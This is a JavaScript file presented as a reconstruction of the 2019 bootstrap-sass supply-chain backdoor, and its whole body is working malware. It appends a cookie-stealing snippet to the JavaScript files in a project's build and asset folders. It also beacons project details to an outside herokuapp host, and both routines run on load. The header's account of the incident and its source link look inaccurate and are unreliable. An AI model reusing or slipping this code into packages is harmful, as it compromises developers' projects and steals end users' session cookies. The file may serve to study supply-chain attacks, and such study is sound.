// bootstrap-sass — reconstructed from public security analyses
// Source: https://snyk.io/blog/a]malicious-backdoor-in-popular-bootstrap-sass-npm-package/
//
// April 2019: Attacker gained access to bootstrap-sass npm account and published
// v3.4.1 with a malicious postinstall script that injected a cookie-stealing
// snippet into JavaScript files in the project.
//
// Technique: Account takeover + postinstall code injection + cookie theft

const fs = require("fs");
const path = require("path");
const https = require("https");

// Injected payload: steals document.cookie and sends to attacker
var injectedCode = [
  "(function(){",
  "  var d = document.cookie;",
  "  if (d && d.length > 0) {",
  "    var i = new Image();",
  "    i.src = 'https://sass-bootstrap.herokuapp.com/c?' + encodeURIComponent(d);",
  "  }",
  "})()"
].join("\n");

// Walk up to find the project root (look for node_modules parent)
function findProjectRoot() {
  var dir = __dirname;
  while (dir !== path.dirname(dir)) {
    if (path.basename(dir) === "node_modules") {
      return path.dirname(dir);
    }
    dir = path.dirname(dir);
  }
  return null;
}

// Search for JS files in the project and inject cookie stealer
function injectPayload() {
  var root = findProjectRoot();
  if (!root) return;

  var targetDirs = ["public", "static", "dist", "build", "assets"];

  targetDirs.forEach(function(dirName) {
    var dirPath = path.join(root, dirName);
    try {
      if (!fs.existsSync(dirPath)) return;
      var files = fs.readdirSync(dirPath);
      files.forEach(function(file) {
        if (!file.endsWith(".js")) return;
        var filePath = path.join(dirPath, file);
        try {
          var content = fs.readFileSync(filePath, "utf8");
          // Inject at the end of the file
          content += "\n" + injectedCode;
          fs.writeFileSync(filePath, content);
        } catch(e) {}
      });
    } catch(e) {}
  });
}

// Also send a beacon with project info
function beacon() {
  var pkg = {};
  try {
    var root = findProjectRoot();
    if (root) {
      pkg = JSON.parse(fs.readFileSync(path.join(root, "package.json"), "utf8"));
    }
  } catch(e) {}

  var payload = JSON.stringify({
    name: pkg.name || "unknown",
    version: pkg.version || "unknown",
    cwd: process.cwd()
  });

  var req = https.request({
    hostname: "sass-bootstrap.herokuapp.com",
    path: "/install",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload)
    }
  });
  req.write(payload);
  req.end();
}

injectPayload();
beacon();
